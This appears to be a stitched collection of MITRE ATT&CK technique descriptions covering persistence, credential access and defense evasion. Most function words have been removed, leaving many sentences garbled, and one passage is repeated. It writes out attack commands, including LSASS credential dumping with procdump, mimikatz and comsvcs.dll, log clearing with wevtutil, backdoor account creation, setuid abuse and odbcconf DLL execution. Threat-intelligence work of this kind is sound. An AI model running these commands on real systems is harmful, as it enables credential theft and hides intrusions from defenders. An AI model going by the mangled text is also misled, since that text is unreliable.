Adversaries register code executed encounters specific interrupts persistence mechanism. Trap commands format <code>trap 'command list' signals</code> "command list" executed "signals" received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements) Adversaries execute malicious payloads hijacking environment variables dynamic linker load shared libraries. execution preparation phase program, dynamic linker loads absolute paths shared libraries environment variables files, <code>LD_PRELOAD</code> Linux <code>DYLD_INSERT_LIBRARIES</code> macOS. Libraries environment variables loaded first, precedence libraries function name.(Citation: LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) variables developers debug binaries recompile, deconflict mapped symbols, implement custom functions changing original library.(Citation: Baeldung LD_PRELOAD)

On Linux macOS, hijacking dynamic linker variables grant access victim process's memory, system/network resources, elevated privileges. method evade detection security products execution masked legitimate process. Adversaries set environment variables command <code>export</code> command, <code>setenv</code> function, <code>putenv</code> function. Adversaries leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) export variables set variables programmatically level syntax Python’s <code>os.environ</code>.

On Linux, adversaries set <code>LD_PRELOAD</code> malicious libraries match legitimate libraries requested victim program, causing operating load adversary's malicious code execution victim program. <code>LD_PRELOAD</code> set environment variable <code>/etc/ld.so.preload</code> file.(Citation: LD.SO)(Citation: TLDP Shared Libraries) Libraries <code>LD_PRELOAD</code> loaded mapped memory <code>dlopen()</code> <code>mmap()</code> respectively.(Citation: Code Injection Linux macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) 

On macOS behavior conceptually Linux, differing macOS dynamic libraries (dyld) implemented level. Adversaries set <code>DYLD_INSERT_LIBRARIES</code> environment variable malicious libraries names legitimate libraries functions requested victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass)  Adversaries create local account maintain access victim systems. Local accounts configured organization users, remote support, services, administration single service. sufficient level access, <code>net user /add</code> command create local account. macOS systems <code>dscl -create</code> command create local account.

Such accounts establish secondary credentialed access require persistent remote access tools deployed system. Adversaries perform command control compromised hosts disconnected networks removable media transfer commands system. systems compromised, likelihood Internet-connected compromised lateral movement [Replication Removable Media](https://attack.mitre.org/techniques/T1091). Commands files relayed disconnected Internet-connected adversary direct access. Adversaries Windows Event Logs hide activity intrusion. Windows Event Logs record computer's alerts notifications. system-defined sources events: System, Application, Security, event types: Error, Warning, Information, Success Audit, Failure Audit.

The event logs cleared utility commands:

* <code>wevtutil system</code>
* <code>wevtutil application</code>
* <code>wevtutil security</code>

These logs cleared mechanisms, event viewer GUI [PowerShell](https://attack.mitre.org/techniques/T1059/001). Adversaries create email accounts targeting. Adversaries accounts created email providers operations, leveraging conduct [Phishing Information](https://attack.mitre.org/techniques/T1598) [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries steps cultivate persona email account, [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), increase chance success follow-on behaviors. Created email accounts acquisition infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)

To decrease chance physically tying operations themselves, adversaries disposable email services.(Citation: Trend Micro R980 2016) responding LLMNR/NBT-NS network traffic, adversaries spoof authoritative source resolution force communication adversary controlled system. activity collect relay authentication materials. 

Link-Local Multicast Resolution (LLMNR) NetBIOS Service (NBT-NS) Windows components serve alternate methods host identification. LLMNR based Domain (DNS) format hosts local link perform resolution hosts. NBT-NS identifies systems local network NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)

Adversaries spoof authoritative source resolution victim network responding LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic identity requested host, effectively poisoning service victims communicate adversary controlled system. requested host belongs resource requires identification/authentication, username NTLMv2 hash adversary controlled system. adversary collect hash wire tools monitor ports traffic [Network Sniffing](https://attack.mitre.org/techniques/T1040) crack hashes offline [Brute Force](https://attack.mitre.org/techniques/T1110) plaintext passwords.

In adversary access authentication path systems automated scans credentials attempt authenticate adversary controlled system, NTLMv2 hashes intercepted relayed access execute code target system. relay step happen conjunction poisoning independent it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries encapsulate NTLMv1/v2 hashes protocols, LDAP, SMB, MSSQL HTTP, expand multiple services valid NTLM response. 

Several tools poison services local networks NBNSpoof, Metasploit, [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder) Adversaries modify file directory permissions/attributes evade access control lists (ACLs) access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 2018) File directory permissions commonly managed ACLs configured file directory owner, users permissions. File directory ACL implementations vary platform, explicitly designate users perform actions (read, write, execute, etc.).

Modifications include changing specific access rights, require ownership file directory elevated permissions depending file directory’s existing permissions. enable malicious activity modifying, replacing, deleting specific files directories. Specific file directory modifications required step techniques, establishing Persistence [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Configuration Modification](https://attack.mitre.org/techniques/T1546/004), tainting/hijacking instrumental binary/configuration files [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).

Adversaries change permissions symbolic links. example, malware (particularly ransomware) modify symbolic links settings enable access files local shortcuts remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior)  Adversaries attempt access credential material stored process memory Local Security Authority Subsystem Service (LSASS). user logs on, generates stores variety credential materials LSASS process memory. credential materials harvested administrative user conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As in-memory techniques, LSASS process memory dumped target host analyzed local system.

For example, target host procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

Built-in Windows tools comsvcs.dll used:

* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Government Sector)


Windows Security Support Provider (SSP) DLLs loaded LSASS process start. loaded LSA, SSP DLLs access encrypted plaintext passwords stored Windows, logged-on user's Domain password smart card PINs. SSP configuration stored Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. adversary modify Registry add SSPs, loaded time boots, AddSecurityPackage Windows API function called.(Citation: Graeber 2014)

The SSPs access credentials:

* Msv: Interactive logons, batch logons, service logons MSV authentication package.
* Wdigest: Digest Authentication protocol designed Hypertext Transfer Protocol (HTTP) Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred mutual client-server domain authentication Windows 2000 later.
* CredSSP:  SSO Network Level Authentication Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
 Adversaries abuse [at](https://attack.mitre.org/software/S0110) utility perform task scheduling initial, recurring, future execution malicious code. [at](https://attack.mitre.org/software/S0110) command Linux operating systems enables administrators schedule tasks.(Citation: Kifarunix - Task Scheduling Linux)

An adversary [at](https://attack.mitre.org/software/S0110) Linux environments execute programs startup scheduled basis persistence. [at](https://attack.mitre.org/software/S0110) abused conduct remote Execution Lateral Movement process context account.

Adversaries abuse [at](https://attack.mitre.org/software/S0110) break restricted environments task spawn interactive commands. Similarly, [at](https://attack.mitre.org/software/S0110) [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) binary allowed superuser <code>sudo</code>.(Citation: GTFObins at) Windows processes leverage application programming interface (API) functions perform tasks require reusable resources. Windows API functions typically stored dynamic-link libraries (DLLs) exported functions. 

Hooking involves redirecting calls functions implemented via:

* **Hooks procedures**, intercept execute designated code response events messages, keystrokes, mouse inputs. (Citation: Hook Overview) (Citation: Elastic Process Injection July 2017)
* **Import address table (IAT) hooking**, modifications process’s IAT, pointers imported API functions stored. (Citation: Elastic Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)
* **Inline hooking**, overwrites bytes API function redirect code flow. (Citation: Elastic Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)

Similar [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries hooking load execute malicious code context process, masking execution allowing access process's memory elevated privileges. Installing hooking mechanisms provide Persistence continuous invocation functions called normal use.

Malicious hooking mechanisms capture API calls include parameters reveal user authentication credentials Credential Access. (Citation: TrojanSpy:Win32/Ursnif.gen!I Sept 2017)

Hooking commonly utilized [Rootkit](https://attack.mitre.org/techniques/T1014)s conceal files, processes, Registry keys, objects hide malware behaviors. (Citation: Symantec Windows Rootkits) Adversaries execute active reconnaissance scans gather targeting. Active scans adversary probes victim infrastructure network traffic, opposed forms reconnaissance involve direct interaction.

Adversaries perform forms active scanning depending seek gather. scans performed ways, including native features network protocols ICMP.(Citation: Botnet Scan)(Citation: OWASP Fingerprinting) scans reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)). Adversaries modify property list files (plist files) execute code establishing persistence. Plist files macOS applications store properties configuration settings applications services. Applications plist files, <code>Info.plist</code>, operating handle application runtime structured metadata form values. Plist files formatted XML based Apple's Core Foundation DTD saved binary format.(Citation: fileinfo plist file description) 

Adversaries modify paths executed binaries, add command arguments, insert key/pair values plist files auto-run locations execute user logon startup. modifying plist files locations, adversaries execute malicious dynamic library (dylib) adding dictionary <code>DYLD_INSERT_LIBRARIES</code> key combined path malicious dylib <code>EnvironmentVariables</code> key plist file. user logon, plist called execution malicious dylib executed process space. Persistence achieved modifying <code>LSEnvironment</code> key application's <code>Info.plist</code> file.(Citation: wardle artofmalware volume1) Adversaries circumvent mechanisms designed control elevate privileges gain higher-level permissions. modern systems native elevation control mechanisms intended limit privileges user perform machine. Authorization granted specific users perform tasks considered risk. adversary perform methods advantage built-in control mechanisms escalate privileges system. Adversaries create process token escalate privileges bypass access controls. Processes created token security context user features <code>CreateProcessWithTokenW</code> <code>runas</code>.(Citation: RunAs)

Creating processes token require credentials target user, specific privileges impersonate user, access token (ex: gathered [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) [Make Impersonate Token](https://attack.mitre.org/techniques/T1134/003)). adversary abuse configurations application setuid setgid bits set code running (and privileged) user’s context. Linux macOS, setuid setgid bits set application binary, application privileges owning user respectively.(Citation: setuid page) application current user’s context, user owns application. However, instances programs executed elevated context function properly, user running specific required privileges.

Instead creating entry sudoers file, root, user setuid setgid flag set applications [Linux Mac File Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). <code>chmod</code> command set bits bitmasking, <code>chmod 4777 [file]</code> shorthand naming, <code>chmod u+s [file]</code>. enable setuid bit. enable setgit bit, <code>chmod 2775</code> <code>chmod g+s</code> used.

Adversaries mechanism malware execute elevated contexts future.(Citation: OSX Keydnap malware) abuse "shell escape" actions bypass execution environment restricted permissions.

Alternatively, adversaries choose target vulnerable binaries setuid setgid bits enabled [File Directory Discovery](https://attack.mitre.org/techniques/T1083)). setuid setguid bits "s" "x" viewing file's attributes <code>ls -l</code>. <code>find</code> command search files. example, <code>find / -perm +4000 2>/dev/null</code> files setuid set <code>find / -perm +2000 2>/dev/null</code> setgid. Binaries bits set abused adversaries.(Citation: GTFOBins Suid) Adversaries abuse features Winlogon execute DLLs executables user logs in. Winlogon.exe Windows component responsible actions logon/logoff secure attention sequence (SAS) triggered Ctrl-Alt-Delete. Registry entries <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> manage additional helper programs functionalities support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) 

Malicious modifications Registry Winlogon load execute malicious DLLs executables. Specifically, subkeys vulnerable abuse: (Citation: Cylance Reg Persistence Sept 2013)

* Winlogon\Notify - notification package DLLs handle Winlogon events
* Winlogon\Userinit - userinit.exe, user initialization program executed user logs on
* Winlogon\Shell - explorer.exe, executed user logs on

Adversaries advantage features repeatedly execute malicious code establish persistence. BIOS (Basic Input/Output System) Unified Extensible Firmware Interface (UEFI) Extensible Firmware Interface (EFI) examples firmware operate software interface operating hardware computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: UEFI)

System firmware BIOS (U)EFI underly functionality modified adversary perform assist malicious activity. Capabilities exist overwrite firmware, sophisticated adversaries install malicious firmware updates persistence difficult detect. Adversaries [Valid Accounts](https://attack.mitre.org/techniques/T1078) interact remote machines advantage Distributed Component Object Model (DCOM). adversary perform actions logged-on user.

The Windows Component Object Model (COM) component native Windows application programming interface (API) enables interaction software objects, executable code implements interfaces. COM, client object methods server objects, typically Dynamic Link Libraries (DLL) executables (EXE). Distributed (DCOM) transparent middleware extends functionality local remote procedure (RPC) technology.(Citation: Fireeye Hunting June 2019)(Citation: COM)

Permissions interact local remote server objects access control lists (ACL) Registry.(Citation: Process Wide Keys) default, Administrators remotely activate launch objects DCOM.(Citation: ACL)

Through DCOM, adversaries operating context appropriately privileged user remotely arbitrary direct shellcode execution Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Windows objects insecure methods.(Citation: Enigma MMC20 Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM execute macros existing documents(Citation: Enigma Excel DCOM Sept 2017) invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution created instance Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing malicious document. DCOM method remotely interacting [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI) file opened, default program file (also called file association handler) checked. File association selections stored Windows Registry edited users, administrators, programs Registry access (Citation: Change Default Programs) (Citation: File Handlers) administrators built-in assoc utility. (Citation: Assoc Oct 2017) Applications modify file association file extension arbitrary program file extension opened.

System file associations listed <code>HKEY_CLASSES_ROOT\.[extension]</code>, <code>HKEY_CLASSES_ROOT\.txt</code>. entries handler extension located <code>HKEY_CLASSES_ROOT\[handler]</code>. commands listed subkeys key <code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code>. example:
* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

The values listed commands executed handler file extension. Adversaries modify values continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012) Regsvr32.exe command-line program register unregister object linking embedding controls, including dynamic link libraries (DLLs), Windows systems. Regsvr32.exe execute arbitrary binaries. (Citation: Regsvr32)

Adversaries advantage functionality proxy execution code avoid triggering security tools monitor execution of, modules loaded by, regsvr32.exe process whitelists false positives Windows regsvr32.exe normal operations. Regsvr32.exe signed binary.

Regsvr32.exe bypass process whitelisting functionality load scriptlets execute DLLs user permissions. regsvr32.exe network proxy aware, scripts loaded passing uniform resource locator (URL) file external server argument invocation. method Registry object registered, executed. (Citation: LOLBAS Regsvr32) variation technique referred "Squiblydoo" attack campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe leveraged register Object establish Persistence [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016) Adversaries single list commonly passwords accounts attempt acquire valid account credentials. Password spraying password (e.g. 'Password01'), list commonly passwords, match complexity policy domain. Logins attempted password accounts network avoid account lockouts occur brute forcing single account passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services commonly ports password spraying. Commonly targeted services include following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition management services, adversaries "target single sign-on (SSO) cloud-based applications utilizing federated authentication protocols," externally facing email applications, Office 365.(Citation: US-CERT TA18-068A 2018)

In default environments, LDAP Kerberos connection attempts trigger events SMB, creates Windows "logon failure" event 4625. Adversaries external proxy intermediary network communications command control server avoid direct connections infrastructure. tools exist enable traffic redirection proxies port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries types proxies manage command control communications, provide resiliency connection loss, ride existing trusted communications paths avoid suspicion.

External connection proxies mask destination C2 traffic typically implemented port redirectors. Compromised systems victim environment purposes, purchased infrastructure cloud-based resources virtual private servers. Proxies chosen based likelihood connection compromised investigated. Victim systems communicate external proxy Internet proxy communications C2 server. Adversaries install code externally facing portals, VPN login page, capture transmit credentials users attempt log service. example, compromised login log user credentials logging user service.

This variation input capture conducted post-compromise legitimate administrative access backup measure maintain network access [External Remote Services](https://attack.mitre.org/techniques/T1133) [Valid Accounts](https://attack.mitre.org/techniques/T1078) initial compromise exploitation externally facing service.(Citation: Volexity Virtual Private Keylogging) Adversaries gather email addresses targeting. internal instances exist, organizations public-facing email infrastructure addresses employees.

Adversaries easily gather email addresses, exposed online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses enumerated active [Active Scanning](https://attack.mitre.org/techniques/T1595)), probing analyzing responses authentication services reveal valid usernames system.(Citation: GrimBlog UsernameEnum) example, adversaries enumerate email addresses Office 365 environments querying variety publicly API endpoints, autodiscover GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)

Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) [Brute Force](https://attack.mitre.org/techniques/T1110) [External Remote Services](https://attack.mitre.org/techniques/T1133)). Starting Mac OS 10.7 (Lion), users applications re-opened user reboots machine. Graphical User Interface (GUI) app-by-app basis, property list files (plist) located <code>~/Library/Preferences/com.apple.loginwindow.plist</code> <code>~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist</code>. 

An adversary modify files include link malicious executable provide persistence mechanism time user reboots machine (Citation: Methods Mac Malware Persistence). adversary attempt block indicators events typically captured sensors gathered analyzed. include maliciously redirecting (Citation: Lamin Sept 2017) disabling host-based sensors, Event Tracing Windows (ETW),(Citation: Event Tracing 2018) tampering settings control collection flow event telemetry. (Citation: Medium Event Tracing Tampering 2018) settings stored configuration files Registry accessible administrative utilities [PowerShell](https://attack.mitre.org/techniques/T1086) [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).

ETW interruption achieved multiple ways, defining conditions PowerShell Set-EtwTraceProvider cmdlet interfacing registry alterations.

In network-based reporting indicators, adversary block traffic reporting prevent central analysis. accomplished means, stopping local process responsible forwarding telemetry creating host-based firewall rule block traffic specific hosts responsible aggregating events, security event management (SIEM) products.  **This technique deprecated. [Create Account](https://attack.mitre.org/techniques/T1136), [Web Shell](https://attack.mitre.org/techniques/T1505/003), [External Remote Services](https://attack.mitre.org/techniques/T1133) appropriate.**

Adversaries remote access tool varying command control protocols credentialed access remote services maintain access access mechanism detected mitigated. 

If type tool detected blocked removed response organization gain understanding adversary's tools access, adversary retain access network. Adversaries attempt gain access [Valid Accounts](https://attack.mitre.org/techniques/T1078) [External Remote Services](https://attack.mitre.org/techniques/T1133) external VPNs maintain access interruptions remote access tools deployed target network.(Citation: Mandiant APT1) Adversaries retain access cloud-based infrastructure applications.

Use [Web Shell](https://attack.mitre.org/techniques/T1100) maintain access network externally accessible server. Spearphishing attachment specific variant spearphishing. Spearphishing attachment forms spearphishing employs malware attached email. forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. scenario, adversaries attach file spearphishing email rely [User Execution](https://attack.mitre.org/techniques/T1204) gain execution.

There options attachment Office documents, executables, PDFs, archived files. attachment (and clicking protections), adversary's payload exploits vulnerability executes user's system. spearphishing email plausible reason file opened, explain bypass protections so. email instructions decrypt attachment, zip file password, evade email boundary defenses. Adversaries frequently manipulate file extensions icons attached executables document files, files exploiting application file one. Adversaries attempt access cached domain credentials authentication occur event domain controller unavailable.(Citation: - Cached Creds)

On Windows Vista newer, hash format DCC2 (Domain Cached Credentials version 2) hash, MS-Cache v2 hash.(Citation: PassLib mscache) default cached credentials varies altered system. hash pass-the-hash style attacks, requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) recover plaintext password.(Citation: ired mscache)

With access, tools/utilities [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), secretsdump.py extract cached credentials.

Note: Cached credentials Windows Vista derived PBKDF2.(Citation: PassLib mscache) Adversaries modify SSH <code>authorized_keys</code> file maintain persistence victim host. Linux distributions macOS commonly key-based authentication secure authentication process SSH sessions remote management. <code>authorized_keys</code> file SSH specifies SSH logging user account file configured. file user's directory <code>&lt;user-home&gt;/.ssh/authorized_keys</code>.(Citation: SSH Authorized Keys) Users edit system’s SSH config file modify directives PubkeyAuthentication RSAAuthentication “yes” ensure public key RSA authentication enabled. SSH config file located <code>/etc/ssh/sshd_config</code>.

Adversaries modify SSH <code>authorized_keys</code> files scripts commands add adversary-supplied public keys. cloud environments, adversaries modify SSH authorized_keys file virtual machine command interface rest API. example, Google Cloud CLI’s “add-metadata” command adversary add SSH user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, Azure, adversary update authorized_keys file virtual machine PATCH request API.(Citation: Azure Update Virtual Machines) ensures adversary possessing private key log existing user SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm)

Where authorized_keys files modified cloud APIs command interfaces, adversary achieve privilege escalation target virtual machine add key higher-privileged user.  Loadable Kernel Modules (or LKMs) pieces code loaded unloaded kernel demand. extend functionality kernel reboot system. example, type module device driver, kernel access hardware connected system. (Citation: Linux Kernel Programming) When maliciously, Loadable Kernel Modules (LKMs) type kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) operating privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Adversaries loadable kernel modules covertly persist evade defenses. Examples wild source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)

Common features LKM based rootkits include: hiding itself, selective hiding files, processes network activity, log tampering, providing authenticated backdoors enabling root access non-privileged users. (Citation: iDefense Rootkit Overview)

Kernel extensions, called kext, macOS load functionality LKMs Linux. loaded unloaded <code>kextload</code> <code>kextunload</code> commands. examples used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples wild. (Citation: Securelist Ventir) Windows Security Support Provider (SSP) DLLs loaded Local Security Authority (LSA) process start. loaded LSA, SSP DLLs access encrypted plaintext passwords stored Windows, logged-on user's Domain password smart card PINs. SSP configuration stored Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. adversary modify Registry add SSPs, loaded time boots, AddSecurityPackage Windows API function called.
 (Citation: Graeber 2014) Adversaries gather victim's network security appliances targeting. network security appliances include variety details, existence specifics deployed firewalls, content filters, proxies/bastion hosts. Adversaries target victim network-based intrusion detection systems (NIDS) appliances defensive cybersecurity operations.

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) network security appliances exposed adversaries online accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering reveal opportunities forms reconnaissance (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries establish persistence elevate privileges executing malicious content triggered Image File Execution Options (IFEO) debuggers. IFEOs enable developer attach debugger application. process created, debugger application’s IFEO prepended application’s name, effectively launching process debugger <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Dev Blog IFEO Mar 2010)

IFEOs set Registry Global Flags GFlags tool. (Citation: GFlags Mar 2017) IFEOs represented <code>Debugger</code> values Registry <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> <code>&lt;executable&gt;</code> binary debugger attached. (Citation: Dev Blog IFEO Mar 2010)

IFEOs enable arbitrary monitor program launched program silently exits prematurely terminated second, kernel-mode process). (Citation: Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) debuggers, silent exit monitoring enabled GFlags modifying IFEO silent process exit Registry values <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

Similar [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), Windows Vista Windows Server 2008 later, Registry key modified configures "cmd.exe," program backdoor access, "debugger" accessibility program (ex: utilman.exe). Registry modified, pressing key combination login screen keyboard connected [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) "debugger" program executed privileges. (Citation: Tilbury 2014)

Similar [Process Injection](https://attack.mitre.org/techniques/T1055), values abused privilege escalation causing malicious executable loaded context separate processes computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms provide Persistence continuous triggered invocation.

Malware IFEO [Impair Defenses](https://attack.mitre.org/techniques/T1562) registering invalid debuggers redirect effectively disable security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008) Adversaries abuse odbcconf.exe proxy execution malicious payloads. Odbcconf.exe Windows utility configure Database Connectivity (ODBC) drivers data source names.(Citation: odbcconf.exe) Odbcconf.exe binary digitally signed Microsoft.

Adversaries abuse odbcconf.exe bypass application control solutions account potential abuse. [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe <code>REGSVR</code> flag misused execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Nov 2017) 
 Adversaries search engines collect victims targeting. Search engine services typical crawl online sites context provide users specialized syntax search specific keywords specific types content filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries craft search engine queries depending seek gather. Threat actors search engines harvest victims, specialized queries spillages/leaks sensitive network details credentials. sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) [Phishing](https://attack.mitre.org/techniques/T1566)). Windows security subsystem set components manage enforce security policy domain. Local Security Authority (LSA) main component responsible local security policy user authentication. LSA includes multiple dynamic link libraries (DLLs) security functions, context LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Security Subsystem)

Adversaries target lsass.exe drivers execution persistence. replacing adding illegitimate drivers [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) [DLL Search Hijacking](https://attack.mitre.org/techniques/T1038)), adversary achieve arbitrary code execution triggered continuous LSA operations. Adversaries gather victim's business relationships targeting. organization’s business relationships include variety details, including third-party organizations/domains (ex: managed service providers, contractors, etc.) connected (and elevated) network access. reveal supply chains shipment paths victim’s hardware software resources.

